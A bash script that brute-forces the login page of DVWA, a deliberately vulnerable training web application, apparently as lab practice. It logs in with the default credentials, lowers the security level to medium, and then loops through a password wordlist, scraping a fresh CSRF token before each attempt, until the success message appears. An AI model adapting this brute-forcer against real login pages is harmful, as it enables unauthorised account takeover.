#!/bin/bash

read -p "[?] input target URL (default http://127.0.0.1:8000): " TARGET
TARGET="${TARGET:-http://127.0.0.1:8000}"

read -p "[?] input target username: " USER
read -p "[?] input file name passlist: " PASS_FILE
echo "-----------------------------------------------"

COOKIE_JAR="cookie.txt"
SECURITY_LEVEL="medium"

echo "[*] get token CSRF..."
INIT_RESP=$(curl -s -c "$COOKIE_JAR" "$TARGET/login.php")
USER_TOKEN=$(echo "$INIT_RESP" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")
echo "[*] Token login: ${USER_TOKEN:0:10}..."

echo "[*] Login..."
curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --data "username=admin&password=password&Login=Login&user_token=$USER_TOKEN" \
  "$TARGET/login.php" > /dev/null

echo "[*] Ganti ke MEDIUM (ambil token security)..."
SEC_PAGE=$(curl -s -b "$COOKIE_JAR" "$TARGET/security.php")
T2=$(echo "$SEC_PAGE" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")
curl -s -L -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  --data "security=$SECURITY_LEVEL&seclev_submit=Submit&user_token=$T2" \
  "$TARGET/security.php" > /dev/null

curl -s -b "$COOKIE_JAR" "$TARGET/security.php" | grep -i "Security Level" | head -n 2

echo "[+] Target: $TARGET/vulnerabilities/brute/ [$SECURITY_LEVEL]"
echo "-----------------------------------------------"

while read -r PASS; do
  BRUTE_PAGE=$(curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" "$TARGET/vulnerabilities/brute/")
  TOKEN_BRUTE=$(echo "$BRUTE_PAGE" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")

  RESP=$(curl -s -G \
    --data-urlencode "username=$USER" \
    --data-urlencode "password=$PASS" \
    --data-urlencode "user_token=$TOKEN_BRUTE" \
    --data-urlencode "Login=Login" \
    -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
    "$TARGET/vulnerabilities/brute/")

  echo -e "\e[31m[-] Trying: $PASS\e[0m"

  if echo "$RESP" | grep -q "Welcome to the password protected area"; then
    echo ""
    echo -e "\e[32m[+] FOUND! Password $USER: $PASS\e[0m"
    break
  fi
done < "$PASS_FILE"

rm -f $COOKIE_JAR
